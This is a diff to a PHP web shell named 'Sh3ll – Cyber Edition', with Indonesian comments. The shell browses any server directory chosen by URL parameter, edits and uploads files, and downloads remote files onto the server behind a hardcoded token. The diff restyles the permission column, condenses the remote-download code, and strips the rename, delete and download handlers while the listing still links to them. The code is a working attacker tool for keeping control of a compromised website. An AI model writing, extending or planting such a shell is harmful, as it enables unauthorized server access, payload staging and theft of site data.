@@ -26,7 +26,10 @@ td{
   background:rgba(20,10,40,0.4);transition:background .2s ease;
 }
 tr:hover td{background:rgba(140,60,255,0.2);box-shadow:inset 0 0 8px rgba(160,90,255,0.3);}
-td font[color]{color:#00eaff!important;text-shadow:0 0 4px #7f3aff;}
+.perm-777 { color:#00f0ff; text-shadow:0 0 6px #00eaff; font-weight:bold; }
+.perm-644 { color:#59d6ff; text-shadow:0 0 6px #59d6ff; }
+.perm-444 { color:#ffffff; text-shadow:0 0 3px #888; }
+.perm-other { color:#a589ff; text-shadow:0 0 5px #6f40ff; }
 form{margin:10px auto;background:rgba(25,10,45,0.6);padding:12px;border-radius:6px;width:fit-content;box-shadow:0 0 10px rgba(130,70,255,0.3);}
 input,select,textarea{
   background:#0c0c18;color:#cce3ff;border:1px solid rgba(160,90,255,0.4);
@@ -51,79 +54,47 @@ ul a{color:#ae7bff;}
 define('REMOTE_DL_TOKEN','cyber2025');
 set_time_limit(0);error_reporting(0);
 
-function statusnya($f){$p=@fileperms($f);if($p===false)return'?';$s=[0xC000=>'s',0xA000=>'l',0x8000=>'-',0x4000=>'d'];$t=$s[$p&0xF000]??'?';
-$map=[0x0100,0x0080,0x0040,0x0020,0x0010,0x0008,0x0004,0x0002,0x0001];
-foreach($map as $i=>$b){$t.=($p&$b)?(['r','w','x','r','w','x','r','w','x'][$i]):'-';}
-return$t;}
+// ================= PERMISSION COLOR ===================
+function statusnya($f){
+    $p=@fileperms($f);if($p===false)return'?';
+    $t=[0xC000=>'s',0xA000=>'l',0x8000=>'-',0x4000=>'d'][$p&0xF000]??'?';
+    $m=[0x0100,0x0080,0x0040,0x0020,0x0010,0x0008,0x0004,0x0002,0x0001];
+    foreach($m as $i=>$b){$t.=($p&$b)?(['r','w','x','r','w','x','r','w','x'][$i]):'-';}
+    return$t;
+}
+
+function perm_color($path){
+    $perm = substr(sprintf('%o', @fileperms($path)), -4);
+    $txt = statusnya($path);
+    if ($perm === '0777') return "<span class='perm-777'>$txt</span>";
+    if ($perm === '0644') return "<span class='perm-644'>$txt</span>";
+    if ($perm === '0444') return "<span class='perm-444'>$txt</span>";
+    return "<span class='perm-other'>$txt</span>";
+}
+// ======================================================
 
 function xrmdir($d){$it=@scandir($d);if(!$it)return;foreach($it as $i){if($i=='.'||$i=='..')continue;$p="$d/$i";if(is_dir($p))xrmdir($p);else@unlink($p);}rmdir($d);}
 
-function __download_secure($url, $optname = '') {
-    // Tentukan direktori aktif
-    $reqPath = isset($_GET['path']) ? $_GET['path'] : getcwd();
-    $base = is_dir($reqPath) ? $reqPath : dirname(__FILE__);
-
-    if (!filter_var($url, FILTER_VALIDATE_URL)) {
-        return ['ok' => false, 'err' => 'Invalid URL', 'path' => null];
-    }
-
-    // Nama file
-    $basename = basename(parse_url($url, PHP_URL_PATH) ?? 'download.bin');
-    $basename = preg_replace('/[^A-Za-z0-9._-]/', '_', $basename);
-    $filename = $optname
-        ? preg_replace('/[^A-Za-z0-9._-]/', '_', basename($optname))
-        : $basename;
-
-    $target = rtrim($base, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
-    $ok = false; $err = '';
-
-    // --- cURL method ---
-    if (function_exists('curl_init')) {
-        $ch = curl_init($url);
-        $fp = @fopen($target, 'w');
-        if ($fp) {
-            curl_setopt_array($ch, [
-                CURLOPT_FILE => $fp,
-                CURLOPT_FOLLOWLOCATION => true,
-                CURLOPT_TIMEOUT => 90,
-                CURLOPT_FAILONERROR => true
-            ]);
-            curl_exec($ch);
-            $cerr = curl_error($ch);
-            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-            curl_close($ch);
-            fclose($fp);
-
-            if (!$cerr && $code < 400 && is_file($target)) {
-                $ok = true;
-            } else {
-                @unlink($target);
-                $err = $cerr ?: "HTTP $code";
-            }
-        } else {
-            $err = 'Cannot write file';
-        }
-    }
-
-    // --- Fallback file_get_contents ---
-    if (!$ok) {
-        $data = @file_get_contents($url);
-        if ($data !== false && @file_put_contents($target, $data) !== false) {
-            $ok = true;
-        } else {
-            $err = $err ?: 'Download failed';
-        }
-    }
-
-    if ($ok) @chmod($target, 0644);
-
-    // Path relatif aman
-    $relative = str_replace(dirname(__FILE__), '.', $target);
-    $relative = str_replace('//', '/', $relative);
-
-    return ['ok' => $ok, 'err' => $err, 'path' => $relative];
+function __download_secure($url,$optname=''){
+  $base=getcwd();if(!is_dir($base))return['ok'=>false,'err'=>'Invalid dir','path'=>null];
+  if(!filter_var($url,FILTER_VALIDATE_URL))return['ok'=>false,'err'=>'Invalid URL','path'=>null];
+  $basename=basename(parse_url($url,PHP_URL_PATH)??'file.bin');
+  $basename=preg_replace('/[^A-Za-z0-9._-]/','_',$basename);
+  $filename=$optname?preg_replace('/[^A-Za-z0-9._-]/','_',basename($optname)):$basename;
+  $target=rtrim($base,'/')."/".$filename;
+  $ok=false;$err='';
+  if(function_exists('curl_init')){
+    $ch=curl_init($url);$fp=@fopen($target,'w');
+    if($fp){curl_setopt_array($ch,[CURLOPT_FILE=>$fp,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_TIMEOUT=>90]);
+      curl_exec($ch);$cerr=curl_error($ch);$code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
+      curl_close($ch);fclose($fp);
+      if(!$cerr&&$code<400&&is_file($target))$ok=true;else{@unlink($target);$err=$cerr?:$code;}
+    }else $err='Write fail';
+  }
+  if(!$ok){$d=@file_get_contents($url);if($d!==false&&@file_put_contents($target,$d)!==false)$ok=true;else$err=$err?:'Download failed';}
+  if($ok)@chmod($target,0644);
+  return['ok'=>$ok,'err'=>$err,'path'=>$target];
 }
-
 
 function alfaremotedl(){
   echo"<div style='background:#0b0b10;padding:14px;border-radius:8px;margin:15px auto;max-width:950px;box-shadow:0 0 10px rgba(110,70,255,0.3);'>";
@@ -142,9 +113,8 @@ function alfaremotedl(){
       $p=preg_split('/\s+/',$cmd,3);
       if(count($p)<2||strtolower($p[0])!=='download')echo"<div style='color:#f66'>Use: download &lt;url&gt; [filename]</div>";
       else{$r=__download_secure($p[1],$p[2]??'');
-        echo $r['ok']
-    ? "<div style='color:#6f6'>✅ Success: <span style=\"color:#59d6ff\">".htmlspecialchars($r['path'])."</span></div>"
-    : "<div style='color:#f66'>❌ Error: ".htmlspecialchars($r['err'])."</div>";}
+        echo $r['ok']?"<div style='color:#7f6'>Success: ".htmlspecialchars($r['path'])."</div>":"<div style='color:#f66'>Error: ".htmlspecialchars($r['err'])."</div>";}
+    }
     echo"</div>";
   }
   echo"<div style='color:#888;font-size:12px;margin-top:8px;'>Current dir: ".htmlspecialchars(getcwd())."</div></div>";
@@ -154,6 +124,7 @@ $lokasi=isset($_GET['path'])?$_GET['path']:getcwd();
 $lokasi=str_replace('\\','/',$lokasi);
 $lokasis=@explode('/',$lokasi);
 $lokasinya=@scandir($lokasi);
+
 echo"<h2>Sh3ll – Cyber Edition</h2>";
 echo"<div class='center'>Directory: ";
 foreach($lokasis as $i=>$l){
@@ -164,7 +135,6 @@ echo"</div><ul><li>[ <a href='?'>Home</a> ] [ <a href='?act=remotedl'>RemoteDL</
 
 if(isset($_GET['act'])&&$_GET['act']==='remotedl'){alfaremotedl();exit;}
 
-// upload
 if(isset($_POST['upload'])){
   $file=$_FILES['berkas']['name'];
   $dst="$lokasi/".basename($file);
@@ -188,82 +158,16 @@ if(isset($_GET['edit'])){
   exit;
 }
 
-// === fitur rename ===
-if (isset($_GET['rename'])) {
-    $target = $_GET['rename'];
-
-    // kalau belum submit, tampilkan form rename
-    if (!isset($_POST['rename_do'])) {
-        echo "<form method='post' style='text-align:center;margin-top:20px'>
-        <h3>Rename: ".htmlspecialchars(basename($target))."</h3>
-        <input type='text' name='newname' value='".htmlspecialchars(basename($target))."' 
-         style='width:300px;padding:6px;border-radius:4px;background:#0b0b18;color:#bfefff;
-         border:1px solid rgba(160,90,255,0.4);font-family:monospace;'>
-        <input type='hidden' name='rename_do' value='1'>
-        <input type='submit' value='Change Name'>
-        </form>";
-        exit;
-    }
-
-    // kalau sudah submit
-    if (isset($_POST['rename_do'])) {
-        $new = $lokasi.'/'.trim($_POST['newname']);
-        if (rename($target, $new)) {
-            echo "<center><span style='color:#6f6'>Renamed to: ".htmlspecialchars(basename($new))."</span></center>";
-        } else {
-            echo "<center><span style='color:#f66'>Failed to rename.</span></center>";
-        }
-        echo "<center><a href='?path=".urlencode($lokasi)."' style='color:#59d6ff'>Back</a></center>";
-        exit;
-    }
-}
-
-// === fitur delete ===
-if (isset($_GET['delete'])) {
-    $target = $_GET['delete'];
-
-    // kalau belum dikonfirmasi
-    if (!isset($_POST['delete_do'])) {
-        echo "<form method='post' style='text-align:center;margin-top:25px'>
-        <h3>Delete: ".htmlspecialchars(basename($target))."</h3>
-        <p>Are you sure you want to delete this ".(is_dir($target)?'directory':'file')."?</p>
-        <input type='hidden' name='delete_do' value='1'>
-        <input type='submit' value='Yes, Delete'>
-        <a href='?path=".urlencode($lokasi)."' style='margin-left:10px;color:#59d6ff;'>Cancel</a>
-        </form>";
-        exit;
-    }
-
-    // kalau sudah konfirmasi
-    if (isset($_POST['delete_do'])) {
-        if (is_dir($target)) xrmdir($target);
-        else @unlink($target);
-        echo "<center><span style='color:#6f6'>Deleted: ".htmlspecialchars(basename($target))."</span></center>";
-        echo "<center><a href='?path=".urlencode($lokasi)."' style='color:#59d6ff;'>Back</a></center>";
-        exit;
-    }
-}
-
-
-if(isset($_GET['download'])){
-  $p=$_GET['download'];
-  if(is_file($p)){
-    header('Content-Type: application/octet-stream');
-    header('Content-Disposition: attachment; filename="'.basename($p).'"');
-    readfile($p);exit;
-  }
-}
-
 echo'<table><tr><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>';
 foreach($lokasinya as $f){
   if($f=='.'||$f=='..')continue;
   $p="$lokasi/$f";
   if(is_dir($p)){
-    echo"<tr><td><a href='?path=".urlencode($p)."'>$f</a></td><td>--</td><td><font>".statusnya($p)."</font></td>
+    echo"<tr><td><a href='?path=".urlencode($p)."'>$f</a></td><td>--</td><td>".perm_color($p)."</td>
     <td><a href='?rename=".urlencode($p)."'>rename</a> | <a href='?delete=".urlencode($p)."'>delete</a></td></tr>";
   } else {
     $s=round(@filesize($p)/1024,2).' KB';
-    echo"<tr><td><a href='?edit=".urlencode($p)."'>$f</a></td><td>$s</td><td><font>".statusnya($p)."</font></td>
+    echo"<tr><td><a href='?edit=".urlencode($p)."'>$f</a></td><td>$s</td><td>".perm_color($p)."</td>
     <td><a href='?download=".urlencode($p)."'>download</a> | <a href='?rename=".urlencode($p)."'>rename</a> | <a href='?delete=".urlencode($p)."'>delete</a></td></tr>";
   }
 }
